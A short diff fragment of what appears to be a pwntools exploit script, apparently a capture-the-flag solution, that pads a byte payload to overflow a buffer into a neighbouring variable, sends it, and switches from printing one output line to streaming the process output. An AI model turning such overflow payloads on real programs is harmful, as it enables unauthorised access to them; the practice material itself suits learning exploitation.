@@ -16,4 +16,4 @@ payload += (gen_var_locations[mod][-1] - gen_var_locations[buff][-1]) * b"a"
 payload += b"z"
 p.sendline(payload)
 
-print(p.recvlineS())
+p.stream()
